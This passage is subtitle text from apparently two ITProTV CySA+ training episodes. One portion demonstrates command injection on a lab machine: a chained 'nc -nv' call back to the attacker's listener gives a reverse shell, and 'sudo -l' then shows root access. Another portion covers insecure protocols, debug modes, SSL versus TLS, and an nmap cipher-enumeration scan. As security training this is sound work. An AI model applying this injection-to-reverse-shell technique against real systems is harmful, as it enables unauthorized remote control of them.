00:29:06.120\nThat's a way to chain commands\ntogether inside of a Linux system.\n\n555\n00:29:06.120 --> 00:29:07.440\nThat's why you're seeing that.\n\n556\n00:29:07.440 --> 00:29:11.470\nSo then run nc -nv at this\nIP address on this port, and\n\n557\n00:29:11.470 --> 00:29:13.870\nthen run this executable command.\n\n558\n00:29:14.880 --> 00:29:16.470\nLet's hit go and see what happens.\n\n559\n00:29:16.470 --> 00:29:16.970\nI hit Go.\n\n560\n00:29:18.080 --> 00:29:20.310\nSo now notice I'm not getting a response.\n\n561\n00:29:20.310 --> 00:29:23.075\nSo you might be thinking,\nnothing happened.\n\n562\n00:29:23.075 --> 00:29:26.460\nWell, let's go back to our listener and\nsee.\n\n563\n00:29:26.460 --> 00:29:32.775\nNotice it says,\nconnect to from unknown on said port.\n\n564\n00:29:32.775 --> 00:29:36.550\nIt's just blinking,\nthere is a connection that has been made.\n\n565\n00:29:36.550 --> 00:29:38.540\nWhat if I do, whoami?\n\n566\n00:29:40.210 --> 00:29:40.940\nI'm pentesterlab.\n\n567\n00:29:40.940 --> 00:29:43.235\nI'm no longer root@Cali.\n\n568\n00:29:43.235 --> 00:29:45.980\nI can do hostname, vulnerable.\n\n569\n00:29:45.980 --> 00:29:47.630\nIt's not Cali.\n\n570\n00:29:47.630 --> 00:29:51.660\nI can do id, pentesterlab.\n\n571\n00:29:51.660 --> 00:29:52.680\nI wonder if I can do sudo.\n\n572\n00:29:52.680 --> 00:29:55.960\nSudo -l.\n\n573\n00:29:55.960 --> 00:29:59.190\nI can do root stuff on all commands.\n\n574\n00:29:59.190 --> 00:30:01.787\nSo I have full privileges.\n\n575\n00:30:01.787 --> 00:30:04.418\nI have absolutely full privileges here and\nit's not gonna ask me for\n\n576\n00:30:04.418 --> 00:30:05.490\na password to do anything.\n\n577\n00:30:07.250 --> 00:30:09.460\nAmazing, I have rooted this box,\nbasically.\n\n578\n00:30:09.460 --> 00:30:10.102\n&gt;&gt; Good thing you went to\n\n579\n00:30:10.102 --> 00:30:13.510\nHacking Fest [LAUGH].\n&gt;&gt; Yeah, it was a lot of fun [LAUGH].\n\n580\n00:30:13.510 --> 00:30:15.450\nBut that's the danger of these things,\n\n581\n00:30:15.450 --> 00:30:18.410\nthat's remote code execution,\nthat's what it looks like.\n\n582\n00:30:18.410 --> 00:30:23.134\nI was able to inject code into a string\nthat got interpreted by a remote host and\n\n583\n00:30:23.134 --> 00:30:26.130\nrun, which gave me shell\naccess to the machine.\n\n584\n00:30:26.130 --> 00:30:31.005\nAnd I can take this and start doing all\nsorts of malfeasance that would be very\n\n585\n00:30:31.005 --> 00:30:33.820\nvery bad if I were an actual bad actor.\n&gt;&gt; Shennanigans, yeah,\n\n586\n00:30:33.820 --> 00:30:34.505\nit would be shenannigans all day long.\n\n587\n00:30:34.505 --> 00:30:36.423\nMm-hm.\n&gt;&gt; But Zach, I know we're out of time.\n\n588\n00:30:36.423 --> 00:30:39.920\nIt was a cool demo but we're gonna have\nto save the rest of this for a part two.\n\n589\n00:30:39.920 --> 00:30:42.320\n&gt;&gt; Common vulnerabilities part one.\n\n590\n00:30:42.320 --> 00:30:43.870\nExcellent episode as usual, Daniel.\n\n591\n00:30:43.870 --> 00:30:45.700\nAnd part two will be coming your way.\n\n592\n00:30:45.700 --> 00:30:48.450\nLast words before we move on?\n&gt;&gt; Yeah.\n\n593\n00:30:48.450 --> 00:30:53.430\nIf you find any of these RCEs, or Remote\nCode Execution Type vulnerabilities you're\n\n594\n00:30:53.430 --> 00:30:56.340\ngonna wanna mitigate that super fast,\nbut we just have a lot of\n\n595\n00:30:56.340 --> 00:30:58.560\ndifferent vulnerabilities that\nwe're gonna have to go through.\n\n596\n00:30:58.560 --> 00:31:00.580\nAnd you just need to know the basics.\n\n597\n00:31:00.580 --> 00:31:03.109\nYou don't have to know what I just did,\nbut\n\n598\n00:31:03.109 --> 00:31:07.130\nyou have to understand the concept\nof how I did it, of why it worked.\n\n599\n00:31:07.130 --> 00:31:08.622\nThat's what you need to know for\nthe exam, so\n\n600\n00:31:08.622 --> 00:31:11.660\nwe're gonna continue on that in part two\nthere because we've got plenty more to go.\n\n601\n00:31:11.660 --> 00:31:12.250\n&gt;&gt; Thank you Daniel.\n\n602\n00:31:12.250 --> 00:31:13.100\nDoing a great job.\n\n603\n00:31:13.100 --> 00:31:15.260\nPlus is a wonderful series.\n\n604\n00:31:15.260 --> 00:31:16.460\nMake sure you watch every episode.\n\n605\n00:31:16.460 --> 00:31:17.282\nAnd you'll be glad you did.\n\n606\n00:31:17.282 --> 00:31:21.150\nAnd in the course library, where there's\nthousands of hours of content that\n\n607\n00:31:21.150 --> 00:31:22.880\nis there to help you go further.\n\n608\n00:31:22.880 --> 00:31:24.350\nMake sure you take a look at that too.\n\n609\n00:31:24.350 --> 00:31:26.655\nTell everybody you know about IT Pro TV.\n\n610\n00:31:26.655 --> 00:31:27.698\nIT Pro TV is binge worthy.\n\n611\n00:31:27.698 --> 00:31:28.850\nThanks for watching.\n\n612\n00:31:28.850 --> 00:31:30.410\nI'm Zac\n&gt;&gt; And I'm Daniel Lowrie.\n\n613\n00:31:30.410 --> 00:31:32.914\n&gt;&gt; And we will see you again soon.\n\n614\n00:31:32.914 --> 00:31:38.919\n[MUSIC]\n\n615\n00:31:38.919 --> 00:31:40.980\nThank you for watching ITPro TV.\n\n",

00:00:08.227\n[MUSIC]\n\n4\n00:00:08.227 --> 00:00:13.197\n&gt;&gt; You're watching ITPro.TV.\n&gt;&gt; Hello, and thank you for\n\n5\n00:00:13.197 --> 00:00:16.430\nwatching ITProTV,\nhelping you learn everywhere you go.\n\n6\n00:00:16.430 --> 00:00:17.365\nI'm your host, Zach Memos.\n\n7\n00:00:17.365 --> 00:00:21.950\nFor this episode of SISA plus\ncommon vulnerabilities part two.\n\n8\n00:00:21.950 --> 00:00:23.500\nYou demanded it, we're bringing it to you.\n\n9\n00:00:23.500 --> 00:00:25.170\nWell, actually Daniel Lowrie is.\n\n10\n00:00:25.170 --> 00:00:27.280\nDaniel good to see you, what's going on?\n\n11\n00:00:27.280 --> 00:00:30.940\nTalk to us, tell us.\n&gt;&gt; Good to be back Zach, as always.\n\n12\n00:00:30.940 --> 00:00:34.290\nWe are continuing on with CSA plus or\nSISA plus.\n\n13\n00:00:34.290 --> 00:00:35.500\nIt almost sounds German.\n\n14\n00:00:35.500 --> 00:00:38.390\nWe've been on this-\n&gt;&gt; Cytoplus cytoplus.\n\n15\n00:00:38.390 --> 00:00:39.760\n&gt;&gt; We're doing the German version.\n\n16\n00:00:39.760 --> 00:00:41.430\nIf I could, I wish I could, but I can't.\n\n17\n00:00:41.430 --> 00:00:44.520\nBut we're continuing on today\nwith our common vulnerabilities.\n\n18\n00:00:44.520 --> 00:00:46.170\nWe looked at a few in\nthe previous episodes.\n\n19\n00:00:46.170 --> 00:00:47.730\nSo if you haven't seen that,\ngo check that out.\n\n20\n00:00:47.730 --> 00:00:50.880\nYou're going to need to know those for\nthe exam and just for your.\n\n21\n00:00:50.880 --> 00:00:52.300\nFor your everyday life.\n\n22\n00:00:52.300 --> 00:00:55.490\nBut today, we're going to pick up with\nthat thread and see a few more of\n\n23\n00:00:55.490 --> 00:00:59.331\nthese common vulnerabilities that well,\nwe're going to need to know for the exam,\n\n24\n00:00:59.331 --> 00:01:02.790\nand for our common life.\n&gt;&gt; Can we talk about insecure protocols?\n\n25\n00:01:02.790 --> 00:01:04.560\n&gt;&gt; Yeah, insecure protocols.\n\n26\n00:01:04.560 --> 00:01:08.326\nAll day long, happens more often\nthan you would actually think.\n\n27\n00:01:08.326 --> 00:01:11.660\nYou think well, because we've been talking\nabout this all throughout this series\n\n28\n00:01:11.660 --> 00:01:15.140\nwe have brought up the fact that\nthere are protocols out there that\n\n29\n00:01:16.590 --> 00:01:18.490\nthey don't use any kind of encryption.\n\n30\n00:01:18.490 --> 00:01:22.100\nThey don't use any kind of obfuscation,\nanything.\n\n31\n00:01:22.100 --> 00:01:23.150\nThey're just clear text.\n\n32\n00:01:23.150 --> 00:01:28.330\nHere's the stuff, and if any bad actor\nworth his salt was on the wire able\n\n33\n00:01:28.330 --> 00:01:33.360\nto plug into that and look at that data,\nhe would be able, or she, would be able to\n\n34\n00:01:33.360 --> 00:01:37.900\nlook at that data, and that would be bad.\n&gt;&gt; Why would anyone wanna use that?\n\n35\n00:01:37.900 --> 00:01:39.930\nWhy would anyone choose that?\n&gt;&gt; That's a great question,\n\n36\n00:01:39.930 --> 00:01:42.530\nusually it's for backwards compatibility,\n\n37\n00:01:42.530 --> 00:01:46.180\nsometimes it's just because it's easy.\n&gt;&gt; There you go.\n\n38\n00:01:46.180 --> 00:01:47.430\n&gt;&gt; Remember we talked about that sliding\n\n39\n00:01:47.430 --> 00:01:50.910\nscale of ease and\nusability versus security?\n\n40\n00:01:50.910 --> 00:01:52.900\nIt kinda does that business.\n\n41\n00:01:52.900 --> 00:01:53.780\nWhen you start adding more\n\n42\n00:01:53.780 --> 00:01:56.220\nsecure protocols it becomes\nmore difficult to implement.\n\n43\n00:01:56.220 --> 00:01:58.170\nAnd some people just say hey.\n\n44\n00:01:58.170 --> 00:02:00.770\nWell I know how to do Telnet because\nI've been doing that forever.\n\n45\n00:02:00.770 --> 00:02:04.780\nOr FTP is easy to fire up but\nall this SFTP business.\n\n46\n00:02:04.780 --> 00:02:06.580\nI gotta have a key, blah blah blah.\n\n47\n00:02:06.580 --> 00:02:09.050\nThis is a little too much\nmore than I can handle.\n\n48\n00:02:09.050 --> 00:02:10.980\nNow a days it's not that bad anymore,\n\n49\n00:02:10.980 --> 00:02:13.080\nthese things have become\npretty straight forward.\n\n50\n00:02:13.080 --> 00:02:15.450\nA lot of great documentation\nhas been created.\n\n51\n00:02:15.450 --> 00:02:22.150\nOn getting more, having encrypted\nthings more readily available to us, so\n\n52\n00:02:22.150 --> 00:02:28.570\nthat's become more common practice than in\ndays past, but it still remains a reason\n\n53\n00:02:28.570 --> 00:02:33.100\nwhy some people employ insecure protocols.\n&gt;&gt; I imagine you probably, we can see that\n\n54\n00:02:33.100 --> 00:02:35.492\nmore in legacy enterprise or something?\n&gt;&gt; Exactly.\n\n55\n00:02:35.492 --> 00:02:40.850\nWhen you, inherits something that's\nbeen around for awhile sometimes\n\n56\n00:02:40.850 --> 00:02:46.100\npeople are going, you can't turn that off\nwe need that that is mission critical.\n\n57\n00:02:46.100 --> 00:02:49.800\nAnd it can be for the very reason of\nthat's the way they've always done it,\n\n58\n00:02:49.800 --> 00:02:52.030\nright?\n&gt;&gt; We've been doing that for years.\n\n59\n00:02:52.030 --> 00:02:53.490\nExactly.\n\n60\n00:02:53.490 --> 00:02:56.757\nI hate asking that question especially\nwhen I know that's what's going to be\n\n61\n00:02:56.757 --> 00:02:58.240\nthe answer.\n\n62\n00:02:58.240 --> 00:03:01.310\nWhy are we using FTP\nwhen we could use SFTP?\n\n63\n00:03:02.530 --> 00:03:04.030\nIt's just the way we've always done it.\n\n64\n00:03:04.030 --> 00:03:05.430\nSo why?\n\n65\n00:03:05.430 --> 00:03:06.190\nIs that bad?\n\n66\n00:03:06.190 --> 00:03:07.090\nYeah, it's bad.\n&gt;&gt; [LAUGH]\n\n67\n00:03:07.090 --> 00:03:08.450\n&gt;&gt; Shouldn't be doing that.\n\n68\n00:03:08.450 --> 00:03:11.140\nSo let's move away from that.\n\n69\n00:03:11.140 --> 00:03:15.360\nAnd the good news is a lot of times,\nlike I said, there's a easy transfer.\n\n70\n00:03:15.360 --> 00:03:17.730\nSomeone's just never flipped\nthat switch and made it happen.\n\n71\n00:03:17.730 --> 00:03:20.170\nBut we do need to be looking for\nthese things, maybe.\n\n72\n00:03:20.170 --> 00:03:24.540\nAnother reason, maybe you've installed\na software suite that installed and\n\n73\n00:03:24.540 --> 00:03:26.540\nis using and insecure protocol and\n\n74\n00:03:26.540 --> 00:03:30.620\nyou were unaware of this.\n&gt;&gt; So as we do our vulnerability\n\n75\n00:03:30.620 --> 00:03:35.530\nassessment we now find out that this is\nhappening and maybe someone's exploiting\n\n76\n00:03:35.530 --> 00:03:38.151\nthe fact that that's happened so.\n&gt;&gt; \\Behind the scenes dependencies or so\n\n77\n00:03:38.151 --> 00:03:39.420\nforth?\n&gt;&gt; Exactly.\n\n78\n00:03:39.420 --> 00:03:40.300\nExactly.\n\n79\n00:03:40.300 --> 00:03:43.560\nYou, you've got to buy proxy right?\n\n80\n00:03:43.560 --> 00:03:46.370\nYou've got one piece of software but,\n\n81\n00:03:46.370 --> 00:03:47.881\nyou got the bonus software.\n&gt;&gt; Hm-mm.\n\n82\n00:03:47.881 --> 00:03:49.060\n&gt;&gt; Of insecurity, right?\n\n83\n00:03:49.060 --> 00:03:51.120\nSo that could be another reason.\n\n84\n00:03:51.120 --> 00:03:53.620\nLets see here,\nagain you'll see these in things like,\n\n85\n00:03:53.620 --> 00:03:57.960\nanything that runs cleartext or easily\n\n86\n00:03:57.960 --> 00:04:01.800\nbreakable encryption, and we'll talk\nabout encryption in just a little bit.\n\n87\n00:04:01.800 --> 00:04:04.940\nSo let's move on, debugging modes.\n\n88\n00:04:04.940 --> 00:04:07.700\nSometimes software, or even some hardware,\n\n89\n00:04:07.700 --> 00:04:11.630\nyou'll have the ability to\nwork with a debugging mode.\n\n90\n00:04:11.630 --> 00:04:16.090\nSay, I wanna see the errors,\nI wanna see how this works,\n\n91\n00:04:16.090 --> 00:04:18.670\nand this is for people like developers.\n\n92\n00:04:18.670 --> 00:04:24.180\nSo if I'm a developer, Zach and I,\nwe're both developers at XYZ Corp.\n\n93\n00:04:24.180 --> 00:04:27.740\nWe create a piece of software and\nwe think thing's working great.\n\n94\n00:04:27.740 --> 00:04:33.150\nWe put it out and then our users get a\nhold of it, they start working with and as\n\n95\n00:04:33.150 --> 00:04:36.890\nusers typically do they find themselves in\na precarious position and make it break.\n\n96\n00:04:36.890 --> 00:04:41.410\nThat we didn't think about,\nhow did they break that?\n\n97\n00:04:41.410 --> 00:04:43.830\nWell, we can switch it\ninto debugging mode.\n\n98\n00:04:43.830 --> 00:04:45.960\nSay hey, turn this do that blah,\nblah, blah.\n\n99\n00:04:45.960 --> 00:04:48.850\nThere's a debugging feature in there,\ngo ahead and turn that on and\n\n100\n00:04:48.850 --> 00:04:50.810\ntell me what it says.\n\n101\n00:04:50.810 --> 00:04:53.360\nAnd what's the danger of this debugging?\n\n102\n00:04:53.360 --> 00:04:57.960\nWell the debugging mode is going to be a\nlittle more forthcoming with information,\n\n103\n00:04:57.960 --> 00:04:59.260\nhence the term debugging.\n\n104\n00:04:59.260 --> 00:05:02.620\nI wanna see where an error might\noccur that I didn't expect.\n\n105\n00:05:02.620 --> 00:05:05.000\nA situation is happening\nthat I didn't expect.\n\n106\n00:05:05.000 --> 00:05:08.880\nThreat actors can use this\nvery same mechanism for\n\n107\n00:05:08.880 --> 00:05:12.430\npurposes of understanding, doing a reverse\nengineering, things of that nature.\n\n108\n00:05:12.430 --> 00:05:14.465\n&gt;&gt; Is the next step then smashing bugs?\n\n109\n00:05:14.465 --> 00:05:15.660\n&gt;&gt; [LAUGH] Smashing bugs.\n\n110\n00:05:15.660 --> 00:05:16.960\nYeah, that's exactly right.\n\n111\n00:05:16.960 --> 00:05:21.430\nAs developers, we would say, okay,\nwe have found why that happened.\n\n112\n00:05:21.430 --> 00:05:26.470\nWe didn't anticipate you doing\nthese two things together and\n\n113\n00:05:26.470 --> 00:05:28.310\nthey're kinda stomping on each other.\n\n114\n00:05:28.310 --> 00:05:32.790\nWe see that, we can make a fix, implement\na patch, and all is right with the world.\n\n115\n00:05:32.790 --> 00:05:36.069\nBut if I'm a threat actor maybe I see\nthat that condition is happening and\n\n116\n00:05:36.069 --> 00:05:37.660\nI can exploit it.\n\n117\n00:05:37.660 --> 00:05:40.150\nSo it's, what's the word?\n\n118\n00:05:40.150 --> 00:05:42.390\nLoose leaks, loose lips sink ships.\n\n119\n00:05:42.390 --> 00:05:43.351\nRight there.\n&gt;&gt; [LAUGH]\n\n120\n00:05:43.351 --> 00:05:45.282\n&gt;&gt; I used to say it back in World War II\n\n121\n00:05:45.282 --> 00:05:46.350\nera.\n&gt;&gt; [CROSSTALK]\n\n122\n00:05:46.350 --> 00:05:47.510\n&gt;&gt; Your software and\n\n123\n00:05:47.510 --> 00:05:52.377\nyour debugging modes might be just that\nchatty Cathy that you don't want it\n\n124\n00:05:52.377 --> 00:05:54.707\nto be when it comes to a threat acto.\n\n125\n00:05:54.707 --> 00:05:57.900\nThen being [INAUDIBLE] and\ninformation that you wouldn't want.\n\n126\n00:05:57.900 --> 00:06:01.790\nSo what are some of\nthe things that may leak?\n\n127\n00:06:01.790 --> 00:06:05.430\nWhat are some critical\ninformation that could get out?\n\n128\n00:06:05.430 --> 00:06:07.890\nThings like database info, right?\n\n129\n00:06:07.890 --> 00:06:11.220\nMaybe you have,\nI hate to say this but it happens,\n\n130\n00:06:12.560 --> 00:06:16.680\ncredentials that are hard coded into\nthe machine, maybe that comes out, right?\n\n131\n00:06:16.680 --> 00:06:17.400\nThat could be bad.\n\n132\n00:06:17.400 --> 00:06:18.460\nIt could be devastating.\n\n133\n00:06:18.460 --> 00:06:20.310\nMaybe just users, maybe who knows?\n\n134\n00:06:21.770 --> 00:06:25.360\nWe comment our code a lot,\npeople that are coders.\n\n135\n00:06:25.360 --> 00:06:28.740\nThey put comments in to kind of\nillustrate what functionality,\n\n136\n00:06:28.740 --> 00:06:32.330\nmaybe the comments are visible\nthrough the debugging area, right?\n\n137\n00:06:32.330 --> 00:06:35.870\nAnd that could give you a little more\ninsider information to how that works and\n\n138\n00:06:35.870 --> 00:06:40.650\nagain help with the reverse engineering\nof it or creating an exploit against it.\n\n139\n00:06:40.650 --> 00:06:44.210\nSo these things that we\nhave to worry about.\n\n140\n00:06:44.210 --> 00:06:47.340\nIt could be telling you about\nnetwork infrastructure.\n\n141\n00:06:47.340 --> 00:06:50.980\nAll these things could be\na problem with debugging.\n\n142\n00:06:52.010 --> 00:06:55.205\nI think debugging,\nyou guys get the general idea.\n\n143\n00:06:55.205 --> 00:06:56.000\n&gt;&gt; Mm-hm.\n\n144\n00:06:56.000 --> 00:06:57.090\n&gt;&gt; Debugging mode is there,\n\n145\n00:06:57.090 --> 00:07:00.870\nit's one of those things that maybe\nyou need it, maybe you don't.\n\n146\n00:07:00.870 --> 00:07:04.800\nYou have to weigh the risk, assess that,\nfigure out whether that juice is worth\n\n147\n00:07:04.800 --> 00:07:05.991\nthe squeeze.\n&gt;&gt; [LAUGH]\n\n148\n00:07:05.991 --> 00:07:07.404\n&gt;&gt; And then implement or\n\n149\n00:07:07.404 --> 00:07:09.370\nnot implement as necessary.\n\n150\n00:07:10.980 --> 00:07:13.630\nAll right well we did\nkind of hint at this,\n\n151\n00:07:13.630 --> 00:07:18.330\nlet's talk about issues\nwith encryption ciphers.\n\n152\n00:07:18.330 --> 00:07:21.140\nSpecifically SSL and TLS.\n\n153\n00:07:21.140 --> 00:07:22.330\nThis is a very common thing.\n\n154\n00:07:23.840 --> 00:07:26.800\nIt's getting better, as things do,\nthey get better, but\n\n155\n00:07:26.800 --> 00:07:30.090\nas things get better then they get\nworse again and the cycle continues.\n\n156\n00:07:30.090 --> 00:07:33.390\nIt's a fun merry go round of ups and\ndowns and around, right?\n\n157\n00:07:33.390 --> 00:07:34.300\n&gt;&gt; Well what's the difference between\n\n158\n00:07:34.300 --> 00:07:36.038\nthe two of them?\n&gt;&gt; Great question,\n\n159\n00:07:36.038 --> 00:07:39.923\nbecause just might be a person\nwho believes, well, TLS and SSL.\n\n160\n00:07:39.923 --> 00:07:42.311\nIt's the same thing,\nit's just tomato tomato.\n\n161\n00:07:42.311 --> 00:07:42.877\n&gt;&gt; That's what I was\n\n162\n00:07:42.877 --> 00:07:43.398\nthinking.\n&gt;&gt; But\n\n163\n00:07:43.398 --> 00:07:44.325\nit's not.\n&gt;&gt; Okay.\n\n164\n00:07:44.325 --> 00:07:46.020\n&gt;&gt; It's not that at all.\n\n165\n00:07:46.020 --> 00:07:48.298\nSSL is deprecated.\n\n166\n00:07:48.298 --> 00:07:50.585\nYou should not be using SSL.\n\n167\n00:07:50.585 --> 00:07:52.492\nDo not use SSL.\n\n168\n00:07:52.492 --> 00:07:53.998\nI don't know how many\ntimes I can say that.\n\n169\n00:07:53.998 --> 00:07:56.798\nDo not use SSL.\n\n170\n00:07:56.798 --> 00:07:58.824\nThis is bad, rIght?\n\n171\n00:07:58.824 --> 00:08:01.650\nIt's been smashed, it's been hammered.\n\n172\n00:08:01.650 --> 00:08:05.277\nAnybody with any hacker worth their salt\nwould be able to decrypt this themselves\n\n173\n00:08:05.277 --> 00:08:06.820\nand break that encryption.\n\n174\n00:08:06.820 --> 00:08:12.390\nThey are both protocols that are for\nencryption.\n\n175\n00:08:12.390 --> 00:08:15.280\nThey use a type of encryption SSL.\n\n176\n00:08:15.280 --> 00:08:18.330\nIt's basically instructions set on\nhow we should be encrypting, so\n\n177\n00:08:18.330 --> 00:08:19.170\nkeep that in mind.\n\n178\n00:08:19.170 --> 00:08:20.700\nBut they are not in the same.\n\n179\n00:08:20.700 --> 00:08:22.500\nSSL is compromised insecure.\n\n180\n00:08:22.500 --> 00:08:24.940\nTLS was the replacement for SSL.\n\n181\n00:08:24.940 --> 00:08:28.170\nIt was like,\nlet's take what they're doing with SSL but\n\n182\n00:08:28.170 --> 00:08:31.275\nlet's leave out the crap\nthat makes it crap.\n\n183\n00:08:31.275 --> 00:08:33.560\n[LAUGH] Or not good, should I say.\n\n184\n00:08:33.560 --> 00:08:37.130\nAnd make it more robust,\nso TLS is the way to go.\n\n185\n00:08:37.130 --> 00:08:38.570\n&gt;&gt; So, Daniel, if we're using SSL and\n\n186\n00:08:38.570 --> 00:08:40.670\nwe wanna switch to TLS,\nis that a hard process,\n\n187\n00:08:40.670 --> 00:08:45.080\nor is it relatively easy?\n&gt;&gt; Most things have TLS embedded,\n\n188\n00:08:45.080 --> 00:08:47.840\nat this point in time,\nas far as being able to say, well,\n\n189\n00:08:47.840 --> 00:08:50.310\nI would like to use TLS, or\nI would like to use SSL.\n\n190\n00:08:50.310 --> 00:08:54.040\nAnd then you've got the versions there.\n&gt;&gt; So it's pretty simple.\n\n191\n00:08:54.040 --> 00:08:55.640\n&gt;&gt; Yeah, It should be.\n\n192\n00:08:55.640 --> 00:08:59.000\nIf you're developing an application\nyou'll have to input that support.\n\n193\n00:08:59.000 --> 00:09:03.540\nAnd that's obviously, however you do that\nas a coder, I'm not a coder per say.\n\n194\n00:09:03.540 --> 00:09:06.600\nSo, I wouldn't know how to do that but\nthe people that\n\n195\n00:09:06.600 --> 00:09:11.990\nwrite code do know how to do that and they\nwould just have to implement TLS support.\n\n196\n00:09:11.990 --> 00:09:13.950\nThere you go, cool.\n\n197\n00:09:13.950 --> 00:09:20.420\nSo let's see here, some older versions\nare used for backward compatibility.\n\n198\n00:09:20.420 --> 00:09:22.325\nSo again, going back to that.\n&gt;&gt; The legacy-\n\n199\n00:09:22.325 --> 00:09:24.010\n&gt;&gt; Legacy systems, right?\n\n200\n00:09:24.010 --> 00:09:30.540\nWell I don't support TLS because we've\nhad this accounting software since\n\n201\n00:09:30.540 --> 00:09:37.210\nthe Stone Age But it is critical because\nnobody knows how to use anything new.\n\n202\n00:09:37.210 --> 00:09:40.100\nWe don't have the time or the resources\nto get up to speed on anything new.\n\n203\n00:09:40.100 --> 00:09:44.370\nSo we have to maintain this,\nand it uses SSL.\n\n204\n00:09:44.370 --> 00:09:48.340\nMaybe it's a web-based financing\nwhatever and it uses SSL.\n\n205\n00:09:48.340 --> 00:09:52.110\nSo now everything has basically\ndropping down to whatever\n\n206\n00:09:52.110 --> 00:09:54.890\nSSL version it's using and\nnow it's insecure.\n\n207\n00:09:54.890 --> 00:09:56.600\nSo be aware that that does happen.\n\n208\n00:09:58.030 --> 00:10:03.460\nLet's talk a little bit about cipher\nnegotiation, what does this look like?\n\n209\n00:10:03.460 --> 00:10:07.580\nHow do these machines make\nthe decision to use SSL or TLS.\n\n210\n00:10:07.580 --> 00:10:10.366\nThat is a great question right?\n\n211\n00:10:10.366 --> 00:10:14.276\nSo let's see here, what happens is\nthe client contacts the server and\n\n212\n00:10:14.276 --> 00:10:16.869\nrequests the secure connection, all right.\n\n213\n00:10:16.869 --> 00:10:21.203\nSo it says, hey, I wanna talk to you but\nlet's, let's make sure that\n\n214\n00:10:21.203 --> 00:10:25.320\nthe prying eyes aren't gonna be able to.\n&gt;&gt; The cone of silence is needed.\n\n215\n00:10:25.320 --> 00:10:27.470\n&gt;&gt; That's right, bring down the cone\n\n216\n00:10:27.470 --> 00:10:29.886\nof silence [INAUDIBLE] right?\n&gt;&gt; Thank\n\n217\n00:10:29.886 --> 00:10:30.633\nyou.\n&gt;&gt; Yes, yes.\n\n218\n00:10:30.633 --> 00:10:34.350\nSo then, so\nit says it sends a client hello message.\n\n219\n00:10:34.350 --> 00:10:37.880\nFrom there a list of supported\nciphers are sent to the server.\n\n220\n00:10:37.880 --> 00:10:40.380\nHere are the ciphers that I support.\n\n221\n00:10:41.730 --> 00:10:46.490\nThe server says you would like\na connection, let me send a server hello.\n\n222\n00:10:46.490 --> 00:10:50.942\nAnd I'm going to choose from your list\nof ciphers, out of my list of ciphers,\n\n223\n00:10:50.942 --> 00:10:55.520\nI'm gonna find the ones that we have\nin common that we both support.\n\n224\n00:10:55.520 --> 00:11:00.510\nAnd typically i'm going to choose\nthe most robust that we both have.\n\n225\n00:11:02.230 --> 00:11:07.240\nIf i use a client that doesn't\nsupport current versions of TLS but\n\n226\n00:11:07.240 --> 00:11:11.740\nonly supports SSL and\nmy server supports those versions of SSL,\n\n227\n00:11:11.740 --> 00:11:14.284\nit will create the connection and\n\n228\n00:11:14.284 --> 00:11:16.430\nsay we have a secure connection.\n&gt;&gt; Viola.\n\n229\n00:11:16.430 --> 00:11:18.030\n&gt;&gt; So that is where these things\n\n230\n00:11:18.030 --> 00:11:19.710\ncan come into hand.\n\n231\n00:11:19.710 --> 00:11:22.770\nLet me show you how you can use Nmap,\na cool little trick here\n\n232\n00:11:22.770 --> 00:11:27.960\nto figure out whether or not, or what\nkind of encryption is being used, right?\n\n233\n00:11:27.960 --> 00:11:32.340\nLet's take a look here, if I do Nmap on\nmy computer, I hope you can see that,\n\n234\n00:11:32.340 --> 00:11:33.590\neverything looks good.\n\n235\n00:11:33.590 --> 00:11:34.820\nIf not I'll zoom in.\n\n236\n00:11:34.820 --> 00:11:39.834\nNmap and you're gonna do -- script -, -,\n\n237\n00:11:39.834 --> 00:11:44.125\nI'm so bad at typing, it's horrible.\n\n238\n00:11:44.125 --> 00:11:46.890\nSSL-cert, that's what\nI'm trying to get out.\n\n239\n00:11:46.890 --> 00:11:47.625\n&gt;&gt; There you go.\n\n240\n00:11:47.625 --> 00:11:51.820\n&gt;&gt; SSL-enum-ciphers,\n\n241\n00:11:51.820 --> 00:11:53.520\nso we're enumerating the ciphers.\n\n242\n00:11:53.520 --> 00:11:58.490\nWe're using that Nmap scripting engine,\nthe NFC to figure out\n\n243\n00:11:58.490 --> 00:12:03.230\nwhat's going on with SSL with this system,\nso that I can know.\n\n244\n00:12:03.230 --> 00:12:05.488\nSo we can use Nmap to do that.\n\n245\n00:12:05.488 --> 00:12:09.020\nAnd then I will do- n so\nit doesn't do any DNS look up.\n\n246\n00:12:09.020 --> 00:12:12.080\nThen I'm gonna give it\nthe port which is 443,\n\n247\n00:12:12.080 --> 00:12:16.740\nthe typical port in which\nSSL TLS is employed.\n\n248\n00:12:16.740 --> 00:12:19.800\nI do also want to sudo this.\n\n249\n00:12:19.800 --> 00:12:21.680\nThere we go.\nGo back.\n\n250\n00:12:21.680 --> 00:12:26.940\nAnd then give it the, and\nI'll just use itpro.tv.\n\n251\n00:12:26.940 --> 00:12:28.150\nSo there we go.\n\n252\n00:12:28.150 --> 00:12:30.350\nZoom in on it just to make sure\nyou guys can see everything.\n\n253\n00:12:32.060 --> 00:12:32.750\nThat's what it looks like.\n\n254\n00:12:32.750 --> 00:12:36.919\nSo sudo nmap --script ssl-cert,\n\n255\n00:12:36.919 --> 00:12:42.434\nssl-enum-ciphers, and then on port 443.\n\n256\n00:12:42.434 --> 00:12:45.431\nIf it's running on a different port,\nuse that port.\n\n257\n00:12:45.431 --> 00:12:48.336\nHere we go, hit fire away,\nhit my password.\n\n258\n00:12:51.085 --> 00:12:54.600\nAnd we're starting Nmap, and here we go.\n&gt;&gt; Bang.\n\n259\n00:12:54.600 --> 00:12:57.460\n&gt;&gt; That was quick, I love it.\n\n260\n00:12:57.460 --> 00:13:02.910\nLet's go back to the top here and\nyou'll see that port 443 was open.\n\n261\n00:13:02.910 --> 00:13:04.610\nOf course, cuz we're using that.\n\n262\n00:13:04.610 --> 00:13:07.160\nGot some stuff about our SSL\ncert giving us the common name,\n\n263\n00:13:07.160 --> 00:13:09.660\nthe organization name,\nstate or providence.\n\n264\n00:13:09.660 --> 00:13:13.710\nSo all the stuff that's inside of our CA,\nour certificates,\n\n265\n00:13:13.710 --> 00:13:15.220\nshould I say, not our CA.\n\n266\n00:13:15.220 --> 00:13:16.120\nThat comes back.\n\n267\n00:13:16.120 --> 00:13:21.580\nSo I'm using certificates to\nauthenticate and create those sessions.\n\n268\n00:13:21.580 --> 00:13:23.680\nHere's what's in that certificate.\n\n269\n00:13:23.680 --> 00:13:26.603\nAnd then the issuer we're using DigiCert.\n\n270\n00:13:26.603 --> 00:13:29.930\nUsing Shaw to extend\nthe validation server as our CA.\n\n271\n00:13:29.930 --> 00:13:34.830\nThere's our CA organization name\nright there in the country we're in.\n\n272\n00:13:34.830 --> 00:13:35.900\nPublic key type 